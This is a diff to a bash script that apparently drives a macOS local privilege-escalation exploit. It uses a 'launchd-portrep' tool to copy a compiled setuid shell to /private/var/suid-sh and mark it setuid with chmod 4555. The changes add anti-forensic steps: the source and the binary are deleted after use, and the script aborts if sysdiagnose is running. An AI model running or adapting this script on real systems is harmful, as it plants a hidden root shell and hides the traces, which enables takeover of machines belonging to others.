@@ -9,7 +9,7 @@
 cd "$( dirname "${BASH_SOURCE[0]}" )"
 
 error() {
-	echo "$1"
+	echo "Error: $1"
 	exit 1
 }
 
@@ -29,10 +29,16 @@ EOF
 
 clang suid-sh.c -o suid-sh || error "Failed to compile suid-sh.c to suid-sh"
 
+rm suid-sh.c
+
 TARGET_SHELL="/private/var/suid-sh"
 SHELL_COMMAND="$(which cp) $(pwd)/suid-sh $TARGET_SHELL; $(which chmod) 4555 $TARGET_SHELL"
 
+pgrep -q sysdiagnose && error "sysdiagnose is running!"
+
 ./launchd-portrep "$SHELL_COMMAND" || error "launchd-portrep failed"
+
+rm suid-sh
 
 [ -f "$TARGET_SHELL" ] || error "Exploit payload failed to create $TARGET_SHELL"
 
